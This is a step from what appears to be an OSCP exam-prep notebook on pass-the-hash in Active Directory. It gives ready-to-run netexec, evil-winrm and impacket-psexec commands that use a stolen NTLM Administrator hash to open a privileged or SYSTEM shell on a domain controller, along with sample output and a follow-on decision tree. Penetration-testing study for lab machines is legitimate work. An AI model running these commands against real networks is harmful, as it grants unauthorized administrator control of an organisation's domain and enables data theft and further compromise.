# AD - Pass the Hash

**Step 49 of 50 · AD**

*Validate the recovered Administrator hash and open a privileged shell without cracking it.*

## Run this

> **Why:** This authenticated SMB or WinRM check validates the recovered credential and reveals whether the account has the requested access.
```bash
# Validate hash
netexec smb $BoxIP -u $AdminUser -H $AdminHash -d $Domain

# WinRM shell (most common on DC)
evil-winrm -i $BoxIP -u $AdminUser -H $AdminHash

# SYSTEM shell via psexec (if WinRM is closed)
impacket-psexec -hashes ":$AdminHash" "$AdminUser@$BoxIP"
```

> **Why:** This command gathers the ad pass the hash evidence needed to decide which documented route applies next.
```cmd
whoami
hostname
# Use Get-ChildItem -Force instead of dir /a in PowerShell
Get-ChildItem -Force C:\Users\Administrator\Desktop\
type C:\Users\Administrator\Desktop\root.txt
```

## Example output

```

SMB  10.10.10.1  445  DC01  [+] htb.local\Administrator (Pwn3d!)
C:\> whoami
nt authority\system
```

## What did you get?

- [ ] SMB validation succeeds → **Run `evil-winrm -i $BoxIP -u $Username -H $AdminHash`, or run `impacket-psexec -hashes :$AdminHash $Domain/$Username@$BoxIP`, then go to Step 50 · [[AD - Clean Down]] after confirming access**
- [ ] WinRM opens as an administrator → **Run `whoami` and `whoami /groups` to confirm the administrator identity, then go to Step 50 · [[AD - Clean Down]]**
- [ ] WinRM is blocked but SMB succeeds → **Run `impacket-psexec -hashes :$AdminHash $Domain/$Username@$BoxIP` to request a SYSTEM shell**
- [ ] Hash validation fails → **Recheck the NTDS field extraction and go to Step 48 · [[AD - DCSync Dump]]**

## Notes

Pass-the-hash uses the NTLM hash directly. Do not print `$AdminHash` in terminal captures or notes.

`psexec` lands as `NT AUTHORITY\SYSTEM` rather than the named administrator account — useful when WinRM is disabled or filtered.

## Gotcha

> [!warning] 💡
> Use the domain context for a domain administrator. A local-auth flag can send the check to the wrong account database.

> [!warning] 💡
> `dir /a` is a cmd.exe flag and fails silently in PowerShell. Use `Get-ChildItem -Force` instead when inside a WinRM/PowerShell session.
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AD technique reference
- [[OSCP/BOXES/WRITE UPS/AD/Sauna|Sauna]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/AD/Blackfield|Blackfield]] -- confirmed in the box write-up

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
